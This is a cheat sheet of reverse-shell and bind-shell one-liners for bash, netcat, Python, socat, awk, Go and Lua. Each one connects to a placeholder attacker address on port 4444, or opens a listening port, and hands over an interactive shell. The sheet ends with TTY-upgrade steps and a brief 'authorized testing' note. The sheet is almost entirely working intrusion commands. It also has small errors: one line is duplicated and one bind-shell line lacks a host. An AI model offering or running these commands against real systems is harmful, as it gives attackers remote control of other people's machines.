# Reverse Shell One-Liners
# Replace ATTACKER-IP and PORT (4444). URL-encode if used in URLs.

## BASH
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
0<&196;exec 196<>/dev/tcp/ATTACKER-IP/4444; bash <&196 >&196 2>&196
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
exec 5<>/dev/tcp/ATTACKER-IP/4444;cat <&5 | while read line; do $line 2>&5 >&5; done

## NETCAT (classic)
nc -e /bin/sh ATTACKER-IP 4444
nc -e /bin/bash ATTACKER-IP 4444
nc -c bash ATTACKER-IP 4444
/bin/nc.evil -e /bin/sh ATTACKER-IP 4444

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

## SOCAT
socat TCP:ATTACKER-IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
socat TCP:ATTACKER-IP:4444 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane

## AWK
awk 'BEGIN {s="/inet/tcp/0/ATTACKER-IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c | getline) > 0) print $0 |& s; close(c) } } while(c!="exit") close(s) }}' /dev/null

## GO
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER-IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go

## LUA
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('ATTACKER-IP',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);f:close();end;t:close();"

## BIND SHELLS (target opens port)
nc -lnvp 4444 -e /bin/bash                 # linux netcat
nc -lnvp 4444 -e cmd.exe                   # windows netcat
nc -nv 4444 -e /bin/sh
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

## UPGRADE TO TTY (post-shell quality)
python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z  →  stty raw -echo  →  fg  →  export TERM=xterm
# Or script: /usr/bin/script -qc /bin/bash /dev/null

## OPSEC NOTE (only for authorized testing)
- Prefer TCP shells to interactive nc on modern hosts.
- If the target has no nc/socat, python/perl are your best bet (often present).
- For Windows targets, the PowerShell one-liner is the standard answer.
